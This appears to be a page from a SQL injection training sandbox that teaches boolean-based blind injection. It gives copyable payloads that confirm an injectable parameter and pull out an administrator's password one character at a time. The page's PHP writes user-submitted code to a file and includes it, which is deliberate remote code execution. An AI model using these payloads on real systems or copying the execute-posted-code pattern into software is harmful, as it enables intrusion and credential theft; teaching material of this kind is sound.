<?php

$server_var = 'localhost';
$username_var = 'sandbox_user';
$password_var = 'password';
$db_var = 'sample_db';

$code = file_get_contents('code_templates/sqli_blind/sqli_b_fn.php');

$output = "";

if (isset($_POST["code"])) {

    $code = $_POST["code"];

    $myfile = fopen("code.php", "w") ;
    
    fwrite($myfile, $code);
    
    ob_start();
    
    include 'code.php';
    
    $output = ob_get_contents();
    
    ob_end_clean();

}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/root/css/style.css">
    <link rel="stylesheet" href="/root/codemirror/codemirror.css">
    <link rel="stylesheet" href="/root/codemirror/ayu-dark.css">
    <script src="/root/codemirror/codemirror.js"></script>
    <script src="/root/codemirror/matchbrackets.js"></script>
    <script src="/root/codemirror/htmlmixed.js"></script>
    <script src="/root/codemirror/xml.js"></script>
    <script src="/root/codemirror/javascript.js"></script>
    <script src="/root/codemirror/css.js"></script>
    <script src="/root/codemirror/clike.js"></script>
    <script src="/root/codemirror/php.js"></script>
</head>
<body>

<?php include 'navigation.php'; ?>

    <div class="main">

    <div class="row">

        <div class="editor_column">

        <table>
        <tr>
            <td>
                <h3 style="margin: 0px 10px 0px 0px;">Boolean-Based SQLi Sandbox</h3>
            </td>
            <td>
                <a href="sqli_blind_time_front_end.php"><button class="buttons">Swap to Time-Based Demo</button></a>
            </td>
        </tr>
        </table>
        
        <br>
        
        <form method="post" action="sqli_blind_front_end.php">
                <textarea id="code" name="code"><?php echo $code; ?></textarea>
                <br>
                <input type="submit" value="Run Code >" class="buttons">
        </form>

        <br>

        <b>Normal Operations</b>
        <p><b>Background: </b>We will be simulating a search function which is unprotected</p>
        <p>Based on the ID given by the user, it will retrieve and display the name and the address based on the ID.</p>

        <b>Reconnaissance</b>

        <ol>

                <li>Click <b>Run Code</b>.</li>

                 <br>

                <li>To initiate this attack, we will need to enter one legitamate input first.</li>

                <br>

                <li>Copy the the text below and paste it on the ID search bar, click <b>Submit</b>.<br><br><span class="code_space">1</span> <button class="buttons" onclick="copyTextOne()">Copy</button></li>
                
                <br>

                <li>You will see the country of origin and the name of the product.</li>

                <br>

                <li>To determine if a component is vulnerable to SQL Injection, an attacker could input the following: </li>

                <p>Copy the code below. If the application returns nothing, it is vulnerable to SQLi</p>

                <p><span class="code_space">1 AND 1 = 2</span> <button class="buttons" onclick="copyTextTwo()">Copy</button></p>

                <p>To confirm, copy the code below. If the application returns an entry, it is vulnerable to SQLi</p>

                <p><span class="code_space">1 AND 1 = 1</span> <button class="buttons" onclick="copyTextThree()">Copy</button></p>

                
        </ol>

        <b>Using Boolean-based SQLi to guess the username and password from the users table</b>

        <ol>

                <li>And now, with the intention of finding out if the users table has an account named "admin", an attacker can perform:</li>
                <p><span class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='admin') </span> <br><br><button class="buttons" onclick="copyTextFour()">Copy</button></p>
                <p>It will return no entry, thus meaning the username admin in the users table does not exist.</p>

                <li>The attacker then tries to find out if the users table has the username "administrator", an attacker can perform:</li>
                <p><div class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='administrator') </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextSeven()">Copy</button></li>
                <p>It will return an entry, thus meaning that the username administrator does indeed exist in the users database.</p>

                <li>The attacker now tries to find out the password of the user "administrator", an attacker can perform:</p>
                <p><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p' </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextEight()">Copy</button></li>
                <p>If it returns an entry it means that the starting letter of the password starts with p</p>
                
                <li>The attacker then tries to guess the second letter after 'p'</p>
                <p><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 2) = 'pa' </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextNine()">Copy</button></li>
                <p>If it returns an entry it means that the the first two characters are pa</p>

                <li>The attacker now makes the assumption that the adminstrator password is password. To confirm, the attacker proceeds to enter the following:</li>
                <p><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 8) = 'password' </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextTen()">Copy</button></p>
                <p>If it returns an entry it means that the administrators' password is password</p>


        </ol>

        
        <p>Let's analyse the back-end code. Click Below.</p>

        <a href="sqli_blind_back_end.php"><button class="buttons">View Boolean-Based attack back-end</button></a>
    
        </div>

        <div class="output_column code_font">

            <?php echo $output; ?>

        </div>

    </div>
    
    <script>
        var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
            lineNumbers: true,
            matchBrackets: true,
            mode: "application/x-httpd-php",
            indentUnit: 4,
            indentWithTabs: true,
            theme: "ayu-dark"
        });

        editor.setSize(null, '330px'); 

        function copyTextOne() {
            var copyText = "1";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextTwo() {
            var copyText = "1 AND 1 = 2";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextThree() {
            var copyText = "1 AND 1 = 1";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextFour() {
            var copyText = "1 AND EXISTS( SELECT * FROM users WHERE username ='admin') ";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextFive() {
            var copyText = "code_templates/sqli_tb_fn_bn.php";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextSix() {
            var copyText = "1 AND IF(1=1, SLEEP(5), SLEEP(0))";
            navigator.clipboard.writeText(copyText);
        }
        
        function copyTextSeven() {
            var copyText = "1 AND EXISTS( SELECT * FROM users WHERE username ='administrator') ";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextEight() {
            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p'";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextNine() {
            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 2) = 'pa'";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextTen() {
            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 8) = 'password'";
            navigator.clipboard.writeText(copyText);
        }
    </script>

</div>

</body>
</html>

